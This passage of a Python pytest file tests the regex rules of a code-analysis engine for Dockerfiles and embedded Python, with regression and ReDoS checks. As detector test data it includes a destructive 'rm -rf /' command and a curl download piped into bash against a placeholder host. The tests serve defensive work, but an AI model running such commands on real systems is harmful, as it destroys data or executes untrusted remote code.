    comment delimiters at all), none of its structural regexes track
    open/close block-comment state -- every keyword-presence rule matches
    via flat line-anchored scanning, not depth-tracking. Docker's one real
    multi-line construct is BuildKit's `<<EOF ... EOF` heredoc (mapped to
    `reflection_metaprogramming`); since the engine performs no
    special-casing of heredoc bodies either, a stray instruction-shaped
    line or a bare `EOF` closing token inside one is scanned exactly the
    same as anywhere else in the file -- there is no block-state tracker
    for it to fool.
    """
    func_start = DOCKERFILE_RULES["func_start"]
    heredoc_with_stray_run = "RUN <<EOF\nRUN this-is-just-text-inside-the-heredoc-body\nEOF\necho done\n"
    matches = [m.group(1) for m in func_start.finditer(heredoc_with_stray_run)]
    assert matches.count("RUN") == 2, (
        "func_start should see both the real RUN <<EOF opener and the stray RUN-shaped line "
        "inside the heredoc body -- there is no block-state tracker for it to be fooled by"
    )


def test_dockerfile_hybrid_sensors_missing_multiline_flag_regression():
    """
    Regression test for the most severe bug found in this sweep: all four
    Hybrid Domain Sensor rules (`serialization_parsing`, `regex_execution`,
    `time_date_logic`, `ipc_rpc_bridges`) were compiled with only the
    inline `(?i)` flag, never `re.M`. Under Python's `re`, `^` without
    MULTILINE anchors to the true start of the *whole* string, not the
    start of each line -- so on any real multi-instruction Dockerfile
    (where `FROM` is always the literal first line), every one of these
    four sensors could only ever fire if its own instruction happened to be
    the literal first line of the file. For `ipc_rpc_bridges`
    (EXPOSE/VOLUME/ENTRYPOINT/CMD/STOPSIGNAL) that is a structural
    impossibility in any valid Dockerfile, since `FROM` must always precede
    them -- meaning it could never fire on any real file at all. Confirmed
    directly (per the issue) against the actual old compiled patterns
    before writing this test: all four had `.flags == 34`
    (IGNORECASE|UNICODE, no MULTILINE) and all four failed to match a
    normal multi-instruction Dockerfile.
    """
    old_serialization_parsing = re.compile(r"(?i)^(?:ADD|COPY)\s+.*\.(?:tar\.gz|zip|tgz|tar)\b")
    old_regex_execution = re.compile(r"(?i)^RUN\s+.*(?:grep|sed|awk)\b")
    old_time_date_logic = re.compile(r"(?i)^(?:HEALTHCHECK.*(?:--interval|--timeout)|RUN\s+.*sleep)\b")
    old_ipc_rpc_bridges = re.compile(r"(?i)^(?:EXPOSE|VOLUME|ENTRYPOINT|CMD|STOPSIGNAL)\b")

    normal_dockerfile = (
        "FROM python:3.12\n"
        "WORKDIR /app\n"
        "ADD app.tar.gz /app\n"
        "HEALTHCHECK --interval=30s CMD curl -f http://localhost/ || exit 1\n"
        "RUN grep -q foo bar.txt\n"
        "EXPOSE 8080\n"
        'CMD ["python", "app.py"]\n'
    )

    # Sanity check: bug must reproduce against the old (re.M-less) patterns.
    assert old_serialization_parsing.flags == 34, "sanity check: old pattern had no re.M"
    assert not old_serialization_parsing.search(normal_dockerfile)
    assert not old_regex_execution.search(normal_dockerfile)
    assert not old_time_date_logic.search(normal_dockerfile)
    assert not old_ipc_rpc_bridges.search(normal_dockerfile), (
        "sanity check: old ipc_rpc_bridges must reproduce the 'can never fire on a real "
        "Dockerfile' bug, since EXPOSE/CMD always come after the mandatory first-line FROM"
    )

    # The fixed patterns all carry re.M and correctly see past the first line.
    for key in ("serialization_parsing", "regex_execution", "time_date_logic", "ipc_rpc_bridges"):
        pattern = DOCKERFILE_RULES[key]
        assert pattern.flags & re.MULTILINE, f"dockerfile {key!r} is still missing re.M"
        assert pattern.search(normal_dockerfile), f"dockerfile {key!r} still fails to match a normal Dockerfile"


def test_dockerfile_hybrid_sensors_continuation_crossing_regression():
    """
    Regression test for a second real bug in the same three body-scanning
    Hybrid sensors (`serialization_parsing`, `regex_execution`,
    `time_date_logic`'s RUN branch), found while checking the issue's
    explicit callout to verify `\\`-continued multi-line RUN instructions:
    Python's `.` never matches `\\n` (no DOTALL), so even after adding
    re.M, the old `.*` body-scan only ever looked at the first physical
    line after the instruction keyword. A classic multi-line `RUN a && \\`
    / `    b && \\` / `    grep ...` chain -- extremely common in real
    Dockerfiles for apt/apk package chains -- silently hid any
    grep/sed/awk/sleep/archive-extension keyword that landed on a
    continuation line rather than the first one.

    Fixed with a bounded continuation-crossing body scan
    (`[^\\n]*(?:\\\\\\r?\\n[^\\n]*){0,50}`, capped at 50 continued lines) that
    still sees across a `\\`-continued instruction while remaining
    ReDoS-safe (verified separately). Must NOT bleed into a *different*,
    non-continued instruction on a later line.
    """
    old_regex_execution = re.compile(r"(?im)^RUN\s+.*(?:grep|sed|awk)\b")
    old_time_date_logic = re.compile(r"(?im)^(?:HEALTHCHECK.*(?:--interval|--timeout)|RUN\s+.*sleep)\b")
    old_serialization_parsing = re.compile(r"(?im)^(?:ADD|COPY)\s+.*\.(?:tar\.gz|zip|tgz|tar)\b")

    multiline_run_grep = "RUN apt-get update && \\\n    apt-get install -y curl && \\\n    grep foo bar\n"
    assert not old_regex_execution.search(multiline_run_grep), "sanity check: bug must reproduce against old pattern"
    regex_execution = DOCKERFILE_RULES["regex_execution"]
    assert regex_execution.search(multiline_run_grep), "should see grep across a backslash continuation"

    multiline_run_sleep = "RUN echo start && \\\n    sleep 5 && \\\n    echo done\n"
    assert not old_time_date_logic.search(multiline_run_sleep), "sanity check: bug must reproduce against old pattern"
    time_date_logic = DOCKERFILE_RULES["time_date_logic"]
    assert time_date_logic.search(multiline_run_sleep), "should see sleep across a backslash continuation"

    multiline_add = "ADD \\\n    app.tar.gz /app\n"
    assert not old_serialization_parsing.search(multiline_add), "sanity check: bug must reproduce against old pattern"
    serialization_parsing = DOCKERFILE_RULES["serialization_parsing"]
    assert serialization_parsing.search(multiline_add), "should see the archive extension across continuation"

    # Must not bleed into a later, unrelated, non-continued instruction.
    no_bleed = "RUN echo hi\nCOPY grep_tool /usr/bin/grep\n"
    assert not regex_execution.search(no_bleed), "must not bleed grep from a later, non-continued COPY line"

    only_first_run_no_sleep = "RUN echo hi\n"
    assert not time_date_logic.search(only_first_run_no_sleep)

    # Same-line (non-continued) forms must still work exactly as before.
    assert regex_execution.search("RUN grep -q foo bar.txt")
    assert time_date_logic.search("RUN sleep 5")
    assert time_date_logic.search("HEALTHCHECK --interval=30s CMD curl -f http://x")
    assert serialization_parsing.search("ADD app.tar.gz /app")


def test_dockerfile_hybrid_sensors_continuation_redos_immunity():
    """
    ReDoS immunity for the Rule 5 bound (`{0,50}`) added by the
    continuation-crossing fix above. Confirmed via direct scaling
    measurement before writing this test, on `regex_execution` against two
    adversarial shapes with no keyword anywhere:

    1. A single huge physical line (`"RUN " + "x" * n`, no newline at all):
       n=2000/4000/8000/16000/32000 -> 0.000198s/0.000374s/0.000754s/
       0.001496s/0.002998s -- a clean ~2x per doubling (linear), because
       `[^\\n]*` followed by a required literal has no adjacent quantifier
       to backtrack against.
    2. Many real backslash-continued lines, well past the `{0,50}` cap
       (`"RUN " + "a && \\\\\\n" * n`): n=2000/4000/8000/16000/32000 ->
       0.000154s/0.000256s/0.000480s/0.000941s/0.001827s -- also a clean
       ~2x per doubling, confirming the numeric clamp bounds the outer
       repetition without the pattern degrading on inputs far larger than
       the cap.

    An earlier draft of this fix (`(?:[ \\t]*\\\\\\r?\\n|[^\\n])*` -- a
    single alternation-based repeat instead of two separately-bounded
    pieces) was tried and rejected during investigation: it hung
    (>120s) on the very first measurement at n=500, because `[ \\t]*`
    nested inside the alternation created the classic ambiguous-tiling
    ReDoS shape (many ways to partition a run of spaces between the two
    alternatives). The shipped fix avoids that by keeping the per-line
    scan (`[^\\n]*`) and the continuation-detector (`\\\\\\r?\\n`) as two
    non-overlapping, separately-quantified pieces instead.
    """
    regex_execution = DOCKERFILE_RULES["regex_execution"]
    serialization_parsing = DOCKERFILE_RULES["serialization_parsing"]
    time_date_logic = DOCKERFILE_RULES["time_date_logic"]

    assert_redos_immune(regex_execution, "RUN " + "x" * 100000, timeout_sec=3.0)
    assert_redos_immune(regex_execution, "RUN " + ("a && \\\n" * 20000), timeout_sec=3.0)
    assert_redos_immune(regex_execution, "RUN " + ("\\" * 50000), timeout_sec=3.0)
    assert_redos_immune(serialization_parsing, "ADD " + "x" * 100000, timeout_sec=3.0)
    assert_redos_immune(time_date_logic, "RUN " + "x" * 100000, timeout_sec=3.0)
    assert_redos_immune(time_date_logic, "HEALTHCHECK " + "x" * 100000, timeout_sec=3.0)

    assert regex_execution.search("RUN grep -q foo bar.txt")


def test_dockerfile_immutability_locks_sha256_prefix_regression():
    """
    Regression test for a real bug: `immutability_locks`' digest-pinning
    alternative required a bare `@` followed directly by 64 hex chars
    (`@[a-f0-9]{64}\\b`), but that is not valid Docker/OCI digest syntax at
    all -- a real pinned image reference is *always* written with the
    algorithm prefix, `@sha256:<64 hex chars>` (e.g.
    `alpine@sha256:e4355b...`). The old pattern could therefore never match
    a real digest-pinned image reference, while it WOULD incorrectly match
    the fictional bare-hex form that no real Dockerfile ever produces.
    """
    old_pattern = re.compile(r"@[a-f0-9]{64}\b|--read-only|:ro\b", re.I)
    hex64 = "e4355b66995c96b4b468159fc5c7e3540fcef961189ca13fee877798dc17daab"
    assert len(hex64) == 64

    real_pin = f"FROM alpine@sha256:{hex64}"
    unrealistic_pin = f"FROM alpine@{hex64}"

    assert not old_pattern.search(real_pin), "sanity check: bug must reproduce against the old pattern"
    assert old_pattern.search(unrealistic_pin), "sanity check: old pattern matched the fictional bare-hex form"

    pattern = DOCKERFILE_RULES["immutability_locks"]
    assert pattern.search(real_pin), "real Docker digest pin (with sha256: prefix) still didn't match"
    assert not pattern.search(unrealistic_pin), "fictional bare-hex form should no longer match"

    # COPY --from= with a real digest reference also works.
    copy_digest = f"COPY --from=alpine@sha256:{hex64} /x /y"
    assert pattern.search(copy_digest)

    # Non-digest forms are unaffected.
    assert pattern.search("--read-only")
    assert pattern.search("- data:/data:ro")
    assert not pattern.search("FROM myimage:robot"), ":ro should not match inside 'robot' (word boundary)"


def test_dockerfile_high_risk_execution_rm_rf_root_regression():
    """
    Regression test for a real bug, and arguably the most severe
    correctness bug in this sweep given what it's meant to detect: the
    `rm -rf /` alternative inside `high_risk_execution` ends on the
    symbolic `/` character, but the whole alternation group shared a single
    trailing `\\b` (Rule 9's canonical defect shape). A `\\b` can only fire
    between a word char and a non-word char -- but in every realistic
    Dockerfile, `rm -rf /` is followed by end-of-instruction, whitespace,
    or `&&`, none of which are word characters, so the trailing `\\b` could
    never actually fire. The single most catastrophic command a Dockerfile
    could contain was silently never detected.
    """
    old_pattern = re.compile(r"\b(?:rm[ \t]+-rf[ \t]+/(?![A-Za-z])|eval|exec)\b", re.M | re.I)
    assert not old_pattern.search("RUN rm -rf /"), "sanity check: bug must reproduce against the old pattern"
    assert not old_pattern.search("RUN rm -rf / && echo done"), "sanity check: bug must reproduce (trailing &&)"

    pattern = DOCKERFILE_RULES["high_risk_execution"]
    assert pattern.search("RUN rm -rf /"), "end-of-instruction 'rm -rf /' still didn't match"
    assert pattern.search("RUN rm -rf / && echo done"), "'rm -rf /' followed by && still didn't match"
    assert not pattern.search("RUN rm -rf /app/tmp"), "scoped rm -rf of a real subdirectory incorrectly matched"
    assert pattern.search("RUN eval $CMD"), "eval regressed"
    assert pattern.search("RUN exec myapp"), "exec regressed"


def test_dockerfile_concurrency_compact_flag_regression():
    """
    Regression test for a real bug: `make -j`/`xargs -P` both end on a word
    char (`j`/`P`) immediately followed by a digit in the compact,
    idiomatic real-world form (`make -j4`, `xargs -P4`) -- a `\\b` cannot
    fire between two adjacent word characters, so the shared trailing `\\b`
    around the whole alternation group only ever matched the spaced-out
    form (`make -j 4`), silently missing the far more common compact one.
    """
    old_pattern = re.compile(r"&[ \t]*$|\b(?:nohup|parallel|make[ \t]+-j|xargs[ \t]+-P)\b", re.M)
    assert not old_pattern.search("RUN make -j4"), "sanity check: bug must reproduce against the old pattern"
    assert old_pattern.search("RUN make -j 4"), "sanity check: spaced-out form already worked"

    pattern = DOCKERFILE_RULES["concurrency"]
    assert pattern.search("RUN make -j4"), "compact 'make -j4' form still didn't match"
    assert pattern.search("RUN make -j 4"), "spaced-out 'make -j 4' form regressed"
    assert pattern.search("RUN xargs -P4 -n1 echo"), "compact 'xargs -P4' form still didn't match"
    assert pattern.search("RUN nohup myserver &"), "nohup regressed"
    assert not pattern.search("RUN echo hi"), "plain recipe incorrectly matched"


def test_dockerfile_ui_framework_lib_prefix_regression():
    """
    Regression test for a real bug: real Debian/Ubuntu apt package names
    for these GUI libraries are almost always `lib`-prefixed
    (`libgtk-3-dev`, `libx11-6`, `libwayland-client0`) -- both "lib" and
    the library tag are word characters, so the old pattern's leading `\\b`
    could never fire partway through a word (`lib|gtk` has no boundary
    between `b` and `g`), silently missing the dominant real-world
    package-name form entirely.
    """
    old_pattern = re.compile(r"\b(?:xvfb|x11|wayland|gtk|qt5?|libgl1-mesa)\b", re.I)
    for line in (
        "RUN apt-get install -y libgtk-3-dev",
        "RUN apt-get install -y libgtk2.0-dev",
        "RUN apt-get install -y libx11-6",
        "RUN apt-get install -y libwayland-client0",
    ):
        assert not old_pattern.search(line), f"sanity check: bug must reproduce against old pattern for {line!r}"

    pattern = DOCKERFILE_RULES["ui_framework"]
    assert pattern.search("RUN apt-get install -y libgtk-3-dev")
    assert pattern.search("RUN apt-get install -y libgtk2.0-dev")
    assert pattern.search("RUN apt-get install -y libx11-6")
    assert pattern.search("RUN apt-get install -y libwayland-client0")
    # Bare (non-lib-prefixed) forms and libgl1-mesa still work as before.
    assert pattern.search("RUN apt-get install -y xvfb")
    assert pattern.search("RUN apt-get install -y qt5-default")
    assert pattern.search("RUN apt-get install -y libgl1-mesa-glx")
    assert not pattern.search("RUN apt-get install -y curl")


def test_dockerfile_func_start_and_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a multi-line macro
    construct hallucinating a function match, as seen with C++'s `#define`
    spiral): dockerfile's `macros` maps to `# syntax=`/`# escape=`
    parser-directive comment lines. Verified empirically that a run of
    these directive lines cannot fool `func_start` (RUN/CMD/ENTRYPOINT/
    HEALTHCHECK) -- a `#`-prefixed comment line never satisfies
    func_start's `^[ \\t]*(RUN|CMD|ENTRYPOINT|HEALTHCHECK)` anchor, and a
    real RUN instruction is unaffected by however many directive lines
    precede it.
    """
    func_start = DOCKERFILE_RULES["func_start"]
    macros = DOCKERFILE_RULES["macros"]

    directive_spiral = "# syntax=docker/dockerfile:1\n" * 50 + "RUN echo hi\n"
    assert len(list(macros.finditer(directive_spiral))) == 50, "all 50 directive lines should satisfy macros"
    func_matches = list(func_start.finditer(directive_spiral))
    assert len(func_matches) == 1 and func_matches[0].group(1) == "RUN", (
        "the directive spiral should not hallucinate extra func_start matches -- only the "
        "real RUN instruction should match"
    )

    single_directive = "# syntax=docker/dockerfile:1\n"
    assert macros.search(single_directive)
    assert not func_start.search(single_directive)


def test_dockerfile_test_and_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a `.test(`-style regex
    method miscounted as a test-framework call, as seen in TypeScript):
    verified empirically rather than assumed. Dockerfile's `test` signature
    is scoped to specific external test-runner invocations (`npm test`,
    `pytest`, `go test`, `cargo test`, `make test`) -- it does not include
    bare `grep`/`sed`/`awk` at all, so it structurally cannot collide with
    `regex_execution`. Also verified the reverse direction: `RUN npm test`
    does not accidentally satisfy `regex_execution` either.
    """
    test_ = DOCKERFILE_RULES["test"]
    regex_execution = DOCKERFILE_RULES["regex_execution"]

    grep_line = "RUN grep -r TODO src/"
    assert regex_execution.search(grep_line)
    assert not test_.search(grep_line)

    npm_test_line = "RUN npm test"
    assert test_.search(npm_test_line)
    assert not regex_execution.search(npm_test_line)


def test_dockerfile_spec_exposure_nested_bracket_no_functional_bug():
    """
    Nested-delimiter audit (Rule 11): `spec_exposure` uses a flat negated
    class (`[^\\]]*`) as its closing-bracket matcher, which cannot
    represent one level of legitimate nesting (e.g. a spec tag that itself
    references an audit tag: `[SPEC-123 ref [audit-9] finding]`).
    Confirmed empirically that this DOES truncate the captured match text
    at the first `]` rather than the outer one -- but confirmed it is NOT a
    functional bug in this codebase: `detector.py`'s comment-stream pass
    (`_analyze_comment_intent`) only ever calls `pattern.findall(...)` and
    takes `len(...)` of the result for `spec_exposure` -- the captured
    substring itself is never read or stored. Truncation therefore has no
    effect on the actual signal the engine records (one bracketed tag still
    counts as one match either way), so this is intentionally left as-is
    rather than upgraded to the one-level-nesting form.
    """
    pattern = DOCKERFILE_RULES["spec_exposure"]
    nested = "[SPEC-123 related to [audit] finding]"
    m = pattern.search(nested)
    assert m is not None
    assert m.group() == "[SPEC-123 related to [audit]", "confirms the truncation behavior exists as documented"

    # Count-based usage (the only way detector.py consumes this rule) is unaffected:
    # exactly one tag in, one match out, regardless of the internal nesting.
    assert len(pattern.findall(nested)) == 1


def test_dockerfile_globals_and_state_mutation_intentional_double_classification():
    """
    Ambiguity sweep: `globals` and `state_mutation` both fire on the same
    `ENV NAME value` line (both anchor `^[ \\t]*ENV[ \\t]+[a-zA-Z0-9_]+`).
    Confirmed genuine, intentional double-classification, not a bug: an
    `ENV` instruction is simultaneously a global-state declaration
    (globals) AND a state mutation that permanently alters the image layer
    (state_mutation) -- both are structurally true at once, the same
    accepted double-classification shape used elsewhere in this codebase
    (e.g. JS's arrow-function call matching both comprehensions and
    closures).
    """
    globals_ = DOCKERFILE_RULES["globals"]
    state_mutation = DOCKERFILE_RULES["state_mutation"]

    env_line = "ENV APP_ENV=production"
    assert globals_.search(env_line)
    assert state_mutation.search(env_line)

    # ARG is deliberately excluded from both (build-time only, not a persisted global).
    arg_line = "ARG APP_ENV=production"
    assert not globals_.search(arg_line)
    assert not state_mutation.search(arg_line)


def test_dockerfile_listeners_and_api_identical_pattern_intentional():
    """
    Ambiguity sweep: `listeners` and `api` are compiled from the literal
    same pattern (`^[ \\t]*EXPOSE[ \\t]+[0-9]+`). Confirmed intentional per
    the source comments: `EXPOSE` is simultaneously part of the container's
    public network surface area (api) AND a declaration that the container
    listens for external network consumption (listeners) -- the same single
    instruction is correctly both, not an accidental duplication.
    """
    listeners = DOCKERFILE_RULES["listeners"]
    api = DOCKERFILE_RULES["api"]
    assert listeners.pattern == api.pattern

    expose_line = "EXPOSE 8080"
    assert listeners.search(expose_line)
    assert api.search(expose_line)


def test_dockerfile_safety_bypasses_curl_pipe_redos_immunity():
    """
    ReDoS immunity for `safety_bypasses`' explicit curl/wget-pipe-to-shell
    guardrail (`\\b(?:curl|wget)[ \\t]+[^|\\n]{1,200}\\|...`), which the
    source comments already claim is ReDoS-safe via the `{1,200}` bound --
    verified directly via scaling measurement rather than trusting the
    comment. Adversarial payload: a `curl` invocation with a very long
    argument string and no closing `|` anywhere.
    """
    pattern = DOCKERFILE_RULES["safety_bypasses"]
    for n in (2000, 8000, 32000):
        assert_redos_immune(pattern, "RUN curl " + "a" * n, timeout_sec=3.0)
    assert pattern.search("RUN curl -fsSL https://get.example.com | bash")


def test_dockerfile_ownership_and_spec_exposure_redos_immunity():
    """
    ReDoS immunity for `ownership`'s trailing `(.*)` capture group and
    `spec_exposure`'s `[^\\]]*` unbounded-then-unanchored class -- both
    flagged in the issue as worth a direct scaling check rather than
    assuming they're safe because they "look bounded by the line". Both
    have exactly one quantified segment with no adjacent quantifier to
    backtrack against, so a long run of non-terminating characters should
    resolve linearly.
    """
    ownership = DOCKERFILE_RULES["ownership"]
    assert_redos_immune(ownership, "MAINTAINER " + "a" * 100000, timeout_sec=3.0)
    m = ownership.search("MAINTAINER Jane Doe <jane@example.com>")
    assert m and m.group(1) == "Jane Doe <jane@example.com>"

    spec_exposure = DOCKERFILE_RULES["spec_exposure"]
    assert_redos_immune(spec_exposure, "[SPEC-123 " + "a" * 100000, timeout_sec=3.0)
    assert spec_exposure.search("[SPEC-123] compliance tag")


# ==============================================================================
# EMBEDDED_PYTHON: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #580)
# ==============================================================================
# NOTE: Two embedded_python regression tests already exist earlier in this
# file and are NOT duplicated here:
#   - test_embedded_python_comprehensions_redos_immunity (comprehensions bound)
#   - test_embedded_python_route_decorators_leading_boundary_regression
#     (ssr_boundaries' @app.get/@app.post leading-@ fix)
EP_RULES = LANGUAGE_DEFINITIONS["embedded_python"]["rules"]

_EMBEDDED_PYTHON_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if button.value:\n    pass", "raise ValueError('x')"),
    ("args", "def blink(pin, times=3):", None),
    ("structural_boundaries", "import machine", None),
    ("func_start", "def blink():", None),
    ("class_start", "class Robot:", None),
    ("safety", "try:\n    read_sensor()\nexcept OSError:\n    pass", None),
    ("safety_bypasses", "except Exception:\n    pass", "except OSError:\n    handle(e)"),
    ("high_risk_execution", "machine.reset()", "print('safe')"),
    ("io", "i2c = I2C(0, scl=Pin(9), sda=Pin(8))", None),
    ("api", "def read_temperature():\n    pass", None),
    ("state_mutation", "led.value(1)", None),
    ("dead_code", "# def old_blink():", "# just a note"),
    ("doc", '"""Blink the onboard LED."""', None),
    ("test", "def test_login():\n    assert True", None),
    ("concurrency", "async def main():\n    await asyncio.sleep(1)", None),
    ("ui_framework", "display.fill(0)", None),
    ("closures", "cb = lambda pin: pin.value()", None),
    ("globals", "global counter", None),
    ("decorators", "@app.route('/status')\ndef status():", None),
    ("generics", "def read() -> Optional[int]:", None),
    ("comprehensions", "[x for x in range(10)]", None),
    ("scientific", "import ulab as np", None),
    ("reflection_metaprogramming", "getattr(sensor, 'read')", None),
    ("import", "from machine import Pin", None),
    ("ownership", "__author__ = 'Jane Doe'", None),
    ("planned_debt", "# TODO: add debouncing", None),
    ("fragile_debt", "# HACK: temporary polling workaround", None),
    ("spec_exposure", "# [SPEC-123] implements the boot contract", None),
    ("ssr_boundaries", 'microdot.Response("ok")', None),
    ("events", "pin.irq(trigger=Pin.IRQ_FALLING, handler=on_press)", None),
    ("macros", "const(BAUD_RATE = 9600)", None),
    ("pointers", "addr = uctypes.addressof(buf)", None),
    ("memory_alloc", "buf = bytearray(64)", None),
    ("inline_asm", "@micropython.asm_thumb\ndef delay(r0):", None),
    ("telemetry", "logger.info('boot complete')", None),
    ("debug_prints", "print('debug value:', x)", None),
    ("explicit_casts", "int(raw_value)", None),
    ("panics_and_aborts", "raise ValueError('bad reading')", None),
    ("thread_sleeps", "time.sleep(1)", None),
    ("bitwise_ops", "mask = flags << 2", None),
    ("sync_locks", "lock = _thread.allocate_lock()", None),
    ("immutability_locks", "cfg = mappingproxy({'x': 1})", None),
    ("cleanup", "i2c.close()", None),
    ("encapsulation", "self._buffer = bytearray(16)", None),
    ("listeners", "pin.irq(handler=on_change)", None),
    ("test_skip", "@pytest.mark.skip", None),
    ("serialization_parsing", "data = ujson.loads(raw)", None),
    ("regex_execution", "m = ure.match(r'^boot', line)", None),
    ("time_date_logic", "now = utime.ticks_ms()", None),
    ("ipc_rpc_bridges", "i2c = machine.I2C(0)", None),
]


@pytest.mark.parametrize("signature,positive,negative", _EMBEDDED_PYTHON_SIMPLE_CASES)
def test_embedded_python_signature_positive_and_negative(signature, positive, negative):
    pattern = EP_RULES[signature]
    assert pattern is not None, f"embedded_python's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"embedded_python {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"embedded_python {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_embedded_python_test_signature_pytest_convention_boundary_regression():
    """
    Regression test for a confirmed real bug: `test_` was wrapped inside the
    shared `\\b(unittest|pytest|assert|test_|setUp|tearDown|Mock)\\b` group.
    `_` is a word character, so the trailing `\\b` after `test_` demands a
    NON-word character immediately follow -- never true for the standard
    pytest naming convention, where a name always continues with more word
    characters (`test_login`, `test_parse_url`). Only a bare, standalone
    trailing "test_" (unrealistic) ever matched.

    Reproduced directly against the *old* (buggy) pattern here, then verified
    the fix (anchored as `def[ \\t]+test_`, matching python's own fix for the
    identical trap) resolves it -- using snippets with no `assert`/`Mock`/etc
    present, so the other alternatives can't mask whether the `test_` path
    itself actually fires.
    """
    old_buggy_pattern = re.compile(r"\b(unittest|pytest|assert|test_|setUp|tearDown|Mock)\b")
    assert not old_buggy_pattern.search("def test_login():\n    pass"), (
        "sanity check failed: the old pattern was expected to NOT match this realistic case"
    )
    assert not old_buggy_pattern.search("def test_parse_url():\n    pass")
    assert old_buggy_pattern.search("test_ "), "sanity check: old pattern only matched the unrealistic trailing form"

    fixed_pattern = EP_RULES["test"]
    assert fixed_pattern.search("def test_login():\n    pass"), "fix did not resolve def test_login()"
    assert fixed_pattern.search("def test_parse_url():\n    pass"), "fix did not resolve def test_parse_url()"
    assert fixed_pattern.search("async def test_boot_sequence():\n    pass"), (
        "fix did not resolve an async pytest-style test function"
    )
    # The other alternatives must still work unaffected by the fix.
    assert fixed_pattern.search("import unittest")
    assert fixed_pattern.search("m = Mock()")
    assert fixed_pattern.search("def setUp(self):")
    assert fixed_pattern.search("def tearDown(self):")
    assert fixed_pattern.search("assert x == 1")


def test_embedded_python_generics_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `generics`'
    `\\[[^\\]]*\\]` was unbounded. On a run of repeated unclosed openers
    (e.g. "List[List[List[..."), every "List[" occurrence is a fresh,
    unanchored search start; at each one the engine greedily consumes to
    end-of-string then backtracks character-by-character looking for a "]"
    that never appears anywhere -- O(n) work per start position across O(n)
    start positions, for O(n^2) total.

    Confirmed via direct scaling measurement against the pre-fix pattern
    before bounding it (~4x runtime per size doubling at
    n=2000/4000/8000/16000 -- the signature of real catastrophic
    backtracking, not the ~2x of a linear scan): 0.0151s / 0.0595s /
    0.2366s / 0.9433s. Bounded to {0,300}; verify the fixed pattern stays
    immune and still matches realistic (including one-level-nested, per
    Rule 11) generic annotations.
    """
    old_buggy_pattern = re.compile(
        r"\b(?:List|Dict|Set|Tuple|Optional|Union|Any|Callable|Sequence|Iterable)\[[^\]]*\]|->"
    )
    import time as _time

    durations = []
    for n in (2000, 4000, 8000, 16000):
        payload = "List[" * n
        start = _time.perf_counter()
        list(old_buggy_pattern.finditer(payload))
        durations.append(_time.perf_counter() - start)
    # Each doubling should show a roughly 4x increase for real O(n^2); assert
    # the ratio between the last two measurements is well above the ~2x a
    # linear-time pattern would show, confirming this really is quadratic.
    assert durations[-1] / durations[-2] > 2.5, (
        f"expected quadratic scaling on the pre-fix pattern, got durations={durations}"
    )

    pattern = EP_RULES["generics"]
    assert_redos_immune(pattern, "List[" * 40000, timeout_sec=3.0)
    assert pattern.search("def read() -> Optional[int]:")
    assert pattern.search("def f(x: Dict[str, List[int]]) -> None: ..."), (
        "fixed pattern lost one-level-nesting coverage (Dict[str, List[int]])"
    )


def test_embedded_python_spec_exposure_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `spec_exposure`'s
    SPEC alternative chains `\\d+` (unbounded) directly into `[^\\]]*`
    (also unbounded, and its character class overlaps `\\d+`'s -- digits
    satisfy both). On a long run of digits with no closing "]" (e.g.
    "[SPEC-" + "1" * n), `\\d+` greedily consumes them all, then backtracks
    one digit at a time while `[^\\]]*` re-consumes the released digit and
    re-fails to find "]" -- the classic adjacent-overlapping-quantifier
    shape.

    Confirmed via direct scaling measurement against the pre-fix pattern
    (~4x runtime per size doubling at n=2000/4000/8000/16000: 0.0030s /
    0.0119s / 0.0473s / 0.1886s). Bounded `\\d+` to `\\d{1,10}` and
    `[^\\]]*` to `{0,300}`; verify the fixed pattern stays immune and still
    matches realistic SPEC/audit tags.
    """
    old_buggy_pattern = re.compile(r"\[(?:\s*SPEC\s*-\s*\d+|spec|audit)[^\]]*\]", re.I)
    import time as _time

    durations = []
    for n in (2000, 4000, 8000, 16000):
        payload = "[SPEC-" + "1" * n
        start = _time.perf_counter()
        list(old_buggy_pattern.finditer(payload))
        durations.append(_time.perf_counter() - start)
    assert durations[-1] / durations[-2] > 2.5, (
        f"expected quadratic scaling on the pre-fix pattern, got durations={durations}"
    )

    pattern = EP_RULES["spec_exposure"]
    assert_redos_immune(pattern, "[SPEC-" + "1" * 80000, timeout_sec=3.0)
    assert pattern.search("# [SPEC-123] implements the boot contract")
    assert pattern.search("# [audit] verified")


def test_embedded_python_func_start_and_class_start_capture_names():
    fs = EP_RULES["func_start"]
    m = fs.search("def read_temp():")
    assert m is not None
    assert m.group(1) == "read_temp"
    assert fs.search("    @staticmethod\n    def read_temp():"), "func_start failed to step over a decorator"
    assert fs.search("async def read_temp():")

    cs = EP_RULES["class_start"]
    m2 = cs.search("class Robot:")
    assert m2 is not None
    assert m2.group(1) == "Robot"


def test_embedded_python_api_excludes_underscore_prefixed_definitions():
    """api captures implicit-public root defs/classes; a leading underscore is explicitly private."""
    pattern = EP_RULES["api"]
    assert pattern.search("def read_temperature():\n    pass")
    assert pattern.search("class Robot:\n    pass")
    assert not pattern.search("def _read_temperature():\n    pass"), (
        "api incorrectly matched an underscore-prefixed function"
    )
    assert not pattern.search("class _Internal:\n    pass"), "api incorrectly matched an underscore-prefixed class"


def test_embedded_python_import_dependency_capture():
    dep_pattern = EP_RULES["_dependency_capture"]
    m = dep_pattern.search("from machine import Pin")
    assert m is not None
    assert m.group(1) == "machine"

    m2 = dep_pattern.search("import network")
    assert m2 is not None
    assert m2.group(1) == "network"


def test_embedded_python_structural_boundaries_and_args():
    boundaries = EP_RULES["structural_boundaries"]
    for kw_snippet in ("def foo():", "class Foo:", "return x", "import os", "yield x", "nonlocal y"):
        assert boundaries.search(kw_snippet), f"structural_boundaries failed to match {kw_snippet!r}"

    args = EP_RULES["args"]
    assert args.search("def foo(a, b):")
    assert args.search("async def foo(a, b):")
    assert args.search("lambda x: x + 1")


def test_embedded_python_bitwise_ops_and_closures_do_not_collide():
    """
    Known ambiguity pattern from the issue template: Python's `lambda`
    keyword shares no token with `<<`, `>>`, `^`, `~`, `&`, `|`.
    """
    bitwise = EP_RULES["bitwise_ops"]
